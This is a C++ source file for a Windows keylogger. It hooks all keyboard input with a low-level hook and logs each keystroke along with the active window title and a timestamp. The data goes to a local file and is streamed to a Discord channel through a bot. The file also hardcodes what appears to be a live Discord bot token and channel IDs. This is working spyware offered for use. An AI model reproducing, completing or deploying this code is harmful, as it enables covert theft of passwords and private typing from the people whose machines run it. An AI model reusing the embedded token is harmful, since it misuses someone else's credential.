#define _CRT_SECURE_NO_WARNINGS     //fuck msvc
#define NOMINMAX //get rid of windef.h bad max/min impl
#define UNICODE
//#define _CONSOLE	//not ready for winmain

//#define MY_PROJ_DEBUG

//#include <windows.h>
//#include <shlobj.h>

//Visual Studio put /external:W0 AFTER /W4, hence defeat the purpose of suppress
//external headers warning (there are ways too much warnings there). This is workaround
#pragma warning (push, 0)

#include <cstdio>
#include <ctime>
#include <cassert>
#include <fstream>
#include <iostream>
#include <map>
#include <vector>
#include <functional>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <algorithm>

#include <dpp/cluster.h>
#include <dpp/once.h>
#pragma warning (pop)

const std::string    BOT_TOKEN    = "Nzk1MjgzNjM2MDg1MzI1ODI1.GJQ65H.orWw99qm-DPXVNYJxb767PoppSohLsphOJKcJw";

class my_string {
	std::string* vec, * temp, ** head;
	const int __reserve_size = 100000;
	//std::mutex __mtex;
	//bool islock = false;

	void init() {
		vec = new std::string();
		temp = new std::string();
		vec->reserve(__reserve_size);
		temp->reserve(__reserve_size);

		head = new std::string * ();
		*head = vec;
	}
public:
	my_string() {
		init();
	}

	my_string(const my_string& obj) {
		init();
		*vec = *(obj.vec);
		*temp = *(obj.temp);
		if (*(obj.head) == obj.vec) {
			*head = vec;
		}
		else *head = temp;
	}

	my_string& operator=(const my_string& obj) {
		init();
		*vec = *(obj.vec);
		*temp = *(obj.temp);
		if (*(obj.head) == obj.vec) {
			*head = vec;
		}
		else *head = temp;
		return *this;
	}

	my_string(const std::string& tvec) {
		init();
		**head = tvec;
	}

	~my_string() {
		delete head;
		delete vec;
		delete temp;
	}

	void try_push(char element) {
		(*head)->push_back(element);
	}

	void try_push(const std::string& element) {
		(*head)->operator+=(element);
	}

	std::string get(size_t size = 2000) {
		return vec->substr(0, size);
	}

	size_t size() {
		return vec->size();
	}

	size_t __temp_size() {
		return temp->size();
	}

	void try_erase(size_t size = 2000) {
		*head = temp;
		// if(vec.size() != 0) {
		vec->erase(0, size);
		// }
		vec->operator+=(*temp);
		*head = vec;
		temp->clear();
	}

};

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

std::map<std::string, unsigned int> mapper, queued_mapper;
unsigned int process_counter = 0;

FILE* output_file, * dbg_file;
my_string vecdata, queued_vecdata;	////////////////
std::queue<my_string> keydata;

// std::mutex sendkey_lock, sendmap_lock, sendtimeline_lock;
std::mutex mx;
std::condition_variable condvar;
bool is_sendkey = false, is_sendtimestamp = false, is_sendmap = false;

std::unique_ptr<dpp::cluster> bot;
dpp::message botmsg;

#ifdef MY_PROJ_DEBUG
/// @brief Wrapped function for formatted print to console
///			and output file in replace for the c++ stuff. 
///			Automatic flush. Maximum 1000 characters
/// @param format formatted string, just like printf
/// @param
inline void print_to(const char* format, ...) {

	char __buf[1001];
	va_list arg;
	va_start(arg, format);
	vsnprintf(__buf, 1000, format, arg);
	va_end(arg);

	printf("%s", __buf);
	fflush(stdout);
	fputs(__buf, dbg_file);
	fflush(dbg_file);
}
#else
inline void print_to(const char* format, ...){}
#endif
inline void print_file(const char* format, ...) {

	char __buf[1001];
	va_list arg;
	va_start(arg, format);
	vsnprintf(__buf, 1000, format, arg);
	va_end(arg);

	fputs(__buf, output_file);
	fflush(output_file);
}

inline void wide_char_to_mb(WCHAR* input, char* output, int outputbuf) {
	WideCharToMultiByte(CP_UTF8, 0, input, -1, output, outputbuf, NULL, NULL);
}

//experimental impl
//communicate with discord
//true if success, false otherwise
void send_data(const std::string& msg, std::string& err) {
	// bool retval = true;
	err = "ok!";
	// other_option();

	botmsg.set_content(msg);

	bot->message_create(botmsg, [&err](const dpp::confirmation_callback_t& eventret) {
		if (eventret.is_error()) {
			auto eventerr = eventret.get_error();
			//std::cout << eventerr.message << "\n";
			err = eventerr.message;
		}
	});

	print_file("%s\n", msg.c_str());
}

//experimental impl
void send_map(std::string& err) {
	std::unique_lock<std::mutex> locker(mx);
	while (is_sendtimestamp) condvar.wait(locker);
	// is_sendmap = true;

	err = "ok!";
	for (auto& pp : queued_mapper) {
		char _buf[501];
		snprintf(_buf, 500, ">%u %s", pp.second, pp.first.c_str());
		std::string data(_buf);

		// send_data(data, err, other_option);
		send_data(data, err);
	}

	is_sendmap = false;
	condvar.notify_all();
}

//experimental impl
void send_timestamp(unsigned int id, time_t stamp, std::string& err) {
	std::unique_lock<std::mutex> locker(mx);
	while (is_sendkey) condvar.wait(locker);
	// is_sendtimestamp = true;

	char _buf[101];
	snprintf(_buf, 100, "[%u %lld", id, stamp);
	std::string data(_buf);
	// send_data(data, err, other_option);
	send_data(data, err);

	is_sendtimestamp = false;
	condvar.notify_all();
}

//experimental impl
void send_key(size_t len, std::string& err) {
	std::unique_lock<std::mutex> locker(mx);
	while (is_sendmap) condvar.wait(locker);
	// is_sendkey = true;

	size_t uselen = std::min(len, keydata.front().size());
	std::string data = keydata.front().get(uselen);
	keydata.front().try_erase(uselen);
	// send_data(data, err, other_option);
	send_data(data, err);

	is_sendkey = false;
	condvar.notify_all();
}

inline void storekeychar(int __stroke) {
	char __buffer[5];
	snprintf(__buffer, 4, "%.2x", __stroke);
	keydata.front().try_push(std::string(__buffer));
}

int Save(int key_stroke) {
	static WCHAR lastwindow[260] = L"";	//must be static or thing will break!
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground) {
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground) {
		WCHAR window_title[260];
		char mbwindow_title[260];

		GetWindowTextW(foreground, window_title, 256);
		if (wcscmp(window_title, lastwindow) != 0)
		{
			wcscpy(lastwindow, window_title);
			wide_char_to_mb(window_title, mbwindow_title, 260);
			std::string strwindow_title(mbwindow_title);
			time_t timestamp = time(NULL);

			if (mapper[strwindow_title] == 0) {
				if (process_counter >= ~(0U)) {
					assert(false && "Internal error! Map overflowed");
				}
				queued_mapper[strwindow_title] = ++process_counter;
				mapper[strwindow_title] = process_counter;
				print_to("\nNew map: %d %s\n", process_counter, mbwindow_title);

				std::string err_sendmap;
				//Mitigation to :Thread autorun after initialization !? 
				is_sendmap = true;
				std::thread sendmap_thread(send_map, std::ref(err_sendmap));
				sendmap_thread.join();
				if (err_sendmap == "ok!") {
					queued_mapper.clear();
				} 
				else {
					assert(false && "Send map error: " && err_sendmap.c_str());
				}
			}

			unsigned int mapper_id = mapper[strwindow_title];

			keydata.push(my_string());
			std::string err_sendkey, err_sendtimestamp;
			//Thread autorun after initialization !? this is mitigation
			is_sendkey = true;
			is_sendtimestamp = true;
			std::thread sendtimestamp_thread(send_timestamp, mapper_id, timestamp, std::ref(err_sendtimestamp));
			std::thread sendkey_thread(send_key, 100, std::ref(err_sendkey));
			sendkey_thread.join();
			sendtimestamp_thread.join();
			if (err_sendkey != "ok!" || err_sendtimestamp != "ok!") {
				assert(false && "Fail to send timestamp and data!");
			}
			keydata.pop();

			print_to("\nMap: Stamp: %u %llu\n", mapper_id, timestamp);
			// print_to("vecdata currently holding %d elements!\n", vecdata.size());
		}
	}

	print_to("[%.2x]", key_stroke);
	storekeychar(key_stroke);

	return 0;
}


LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && wParam == WM_KEYDOWN) {
		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		Save(kbdStruct.vkCode);
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

short is_bot_connected = 0;
std::mutex bot_connected_lock;
std::condition_variable bot_connected_condvar;

void logrun()
{
	std::unique_lock<std::mutex> locker(bot_connected_lock);
	while (is_bot_connected == 0) bot_connected_condvar.wait(locker);
	if (is_bot_connected != -1) {
		printf("Bot successfully initialized. Logging...");
	} else {
		printf("Bot failed to initialized. Terminating...");
		exit(EXIT_FAILURE);
	}

	if (!(_hook = SetWindowsHookExW(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
		printf("Failed to install hook. Terminating...\n");
		exit(EXIT_FAILURE);
	}
	MSG msg;
	while (true) {
		GetMessageW(&msg, NULL, 0, 0);
	}
}

void botrun()
{
	is_bot_connected = 0;
    try {
        /* Create bot cluster */
        bot = std::unique_ptr<dpp::cluster>(new dpp::cluster(BOT_TOKEN,
            dpp::i_default_intents,
            0, 0, 2, true,
            { dpp::cp_aggressive, dpp::cp_aggressive, dpp::cp_aggressive },
            10, 0));

		std::cout << "Hello world\n";

		/* Output simple log messages to stdout */
		bot->on_log(dpp::utility::cout_logger());

        /*
		bot->on_log([](const dpp::log_t& logger) {
			std::cout << logger.message << "\n";
		});
		*/

        /* Handle slash command */
		bot->on_slashcommand([](const dpp::slashcommand_t& event) {
			size_t issuing_user = event.command.get_issuing_user().id;
			std::string issuing_command = event.command.get_command_name();
			if (issuing_command == "ping") {
                event.reply("Pong!");
			}
			if (issuing_command == "version") {
				char buffer[1001];
				snprintf(buffer, 1000, "Hello world! Running on %s. Current time is %s",
					dpp::utility::version().c_str(),
					dpp::utility::current_date_time().c_str());
				event.reply(buffer);
			}
			printf("User %llu executed %s\n", issuing_user, issuing_command.c_str());
        });

        /* Register slash command here in on_ready */
        bot->on_ready([](const dpp::ready_t& event) {
            /* Wrap command registration in run_once to make sure it doesnt run on every full reconnection */
            if (dpp::run_once<struct register_bot_commands>()) {
                bot->global_command_create(dpp::slashcommand("ping", "Ping pong!", bot->me.id));
				bot->global_command_create(dpp::slashcommand("version", "version", bot->me.id));
            }
        });
    
        /* Start the bot */
        bot->start(true);
		is_bot_connected = 1;
		botmsg = dpp::message(bot.get());
		botmsg.set_guild_id(664744934003310592);
		botmsg.set_channel_id(1056052934921699388);
		botmsg.set_content("Session initialized!");
		bot->message_create(botmsg);
		bot_connected_condvar.notify_all();
    }
    catch (dpp::exception& e) {
        printf("\n%s", e.what());
		is_bot_connected = -1;
		bot_connected_condvar.notify_all();
    }
}

inline void init_file() {
	fflush(stdout);
	output_file = fopen("keylogger.log", "w");
	fclose(output_file);
	output_file = fopen("keylogger.log", "a");

	#ifdef MY_PROJ_DEBUG
	dbg_file = fopen("dbglog.txt", "w");
	fclose(dbg_file);
	dbg_file = fopen("dbglog.txt", "a");
	#endif
}

//now switch to windows subsystem, no longer console
//int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
int main() {
	//int argc;
	//WCHAR** argv = CommandLineToArgvW(pCmdLine, &argc);

	init_file();

	ShowWindow(FindWindowW(L"ConsoleWindowClass", NULL), 1); // visible window

	//baseline, might not need
	keydata.push(my_string());

	std::thread t2(botrun);
	std::thread t1(logrun);

	t2.join();
	t1.join();

	fclose(output_file);
	#ifdef MY_PROJ_DEBUG
	fclose(dbg_file);
	#endif
	return 0;
}
